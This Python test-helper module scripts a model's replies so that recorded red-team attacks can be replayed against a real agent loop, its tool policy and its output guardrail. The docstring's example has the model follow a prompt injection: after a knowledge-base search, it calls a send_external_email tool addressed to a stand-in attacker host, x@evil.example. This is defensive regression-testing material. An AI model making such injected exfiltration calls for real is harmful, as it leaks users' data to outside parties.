"""Replay a recorded attack against the real agent loop, with the model's side scripted.

A red-team finding becomes a useful regression test only if it exercises the SYSTEM: the same agent
loop, tool policy and output guardrail that production runs. Scripting the model's replies ("assume the
model follows the injection") keeps the test deterministic, free, and valid whichever model you run
next month.

    model = ScriptedClient(
        calls(("search_kb", {"query": "invoice copies"})),
        calls(("send_external_email", {"to": "x@evil.example", "body": "..."})),
        says("Done."),
    )
    run = run_agent("How do I get invoice copies?", principal, client=model)

Assert on what the system did (run.executed, run.events, and what the model received in model.sent),
not on the scripted replies: in a replay the model says exactly what you wrote.
"""

from __future__ import annotations

import copy
import itertools
import json
from types import SimpleNamespace

_ids = itertools.count(1)


def calls(*tool_calls: tuple[str, dict]) -> SimpleNamespace:
    """A model reply that requests these tool calls, e.g. calls(("lookup_invoice", {"invoice_id": "inv_1001"}))."""
    return _reply(
        content=None,
        tool_calls=[
            SimpleNamespace(
                id=f"call_{next(_ids)}",
                type="function",
                function=SimpleNamespace(name=name, arguments=json.dumps(args)),
            )
            for name, args in tool_calls
        ],
    )


def says(text: str) -> SimpleNamespace:
    """A final model reply without tool calls."""
    return _reply(content=text, tool_calls=None)


def _reply(content, tool_calls) -> SimpleNamespace:
    message = SimpleNamespace(content=content, tool_calls=tool_calls)
    return SimpleNamespace(choices=[SimpleNamespace(message=message)], usage=None)


class ScriptedClient:
    """Stands in for OpenAI(): returns the scripted replies in order and records what the agent sent."""

    def __init__(self, *replies: SimpleNamespace) -> None:
        self._replies = list(replies)
        self.sent: list[list[dict]] = []  # the messages of every model call
        self.chat = SimpleNamespace(completions=SimpleNamespace(create=self._create))

    def _create(self, *, messages: list[dict], **_: object) -> SimpleNamespace:
        self.sent.append(copy.deepcopy(messages))
        if not self._replies:
            raise AssertionError("the agent called the model more often than the recording covers")
        return self._replies.pop(0)

    def tool_results(self) -> str:
        """Everything the tools returned to the model during the run, as one string."""
        return "\n".join(m["content"] for m in self.sent[-1] if m["role"] == "tool") if self.sent else ""
